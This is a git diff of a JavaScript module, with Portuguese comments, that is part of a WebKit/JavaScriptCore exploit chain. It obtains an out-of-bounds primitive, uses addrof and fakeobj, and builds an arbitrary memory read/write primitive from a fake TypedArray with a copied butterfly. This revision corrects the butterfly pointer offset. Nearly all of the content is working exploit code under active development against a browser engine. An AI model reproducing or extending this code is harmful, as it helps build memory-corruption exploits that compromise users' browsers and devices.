@@ -1,10 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v96 - R60 Implementação Funcional Completa de L/E)
+// js/script3/testArrayBufferVictimCrash.mjs (v97 - R60 com Dereferência de Butterfly Corrigida)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Implementação completa e funcional da primitiva de Leitura/Escrita Arbitrária.
-// O script agora usa addrof/fakeobj para construir uma ferramenta de L/E universal
-// a partir de um TypedArray falso com um butterfly modificado. A verificação final
-// é um teste real da nova primitiva.
+// Corrigido o bug crítico onde o endereço do butterfly não era lido corretamente.
+// O script agora lê o ponteiro do butterfly no offset correto (0x10) antes de
+// copiá-lo, garantindo que o objeto falso seja construído com metadados válidos.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -17,7 +16,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_FunctionalRW_v96_R60";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_FunctionalRW_v97_R60";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -46,7 +45,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let final_result = { success: false, message: "A cadeia de L/E Arbitrária não obteve sucesso." };
 
     try {
-        // --- FASE 1: Obtenção da primitiva OOB ---
+        // --- FASE 1: Obtendo primitiva OOB ---
         logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
         if (!getOOBDataView()) throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
@@ -73,12 +72,20 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const rw_driver_addr = addrof(rw_driver_array);
         logS3(`Endereço do 'rw_driver_array' (molde): ${rw_driver_addr.toString(true)}`, "info");
 
+        // **CORREÇÃO CRÍTICA**: Ler o ponteiro do butterfly no offset correto.
+        const butterfly_ptr_addr = new AdvancedInt64(
+            rw_driver_addr.low() + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET,
+            rw_driver_addr.high()
+        );
+        const original_butterfly_addr = await arb_read(butterfly_ptr_addr, 8);
+        if (original_butterfly_addr.equals(0)) {
+            throw new Error("Falha ao ler o endereço do butterfly. O endereço retornado é nulo.");
+        }
+
         const fake_butterfly_buf = new ArrayBuffer(256);
         const fake_butterfly_addr = addrof(fake_butterfly_buf);
-        logS3(`Buffer para o butterfly falso alocado em: ${fake_butterfly_addr.toString(true)}`, "info");
-
-        const original_butterfly_addr = await arb_read(rw_driver_addr, 8);
-        logS3(`Copiando butterfly de ${original_butterfly_addr.toString(true)} para ${fake_butterfly_addr.toString(true)}`, "info");
+        logS3(`Copiando butterfly de ${original_butterfly_addr.toString(true)} para o buffer falso em ${fake_butterfly_addr.toString(true)}`, "info");
+        
         for (let i = 0; i < 16; i += 8) {
             const read_addr = new AdvancedInt64(original_butterfly_addr.low() + i, original_butterfly_addr.high());
             let data = await arb_read(read_addr, 8);
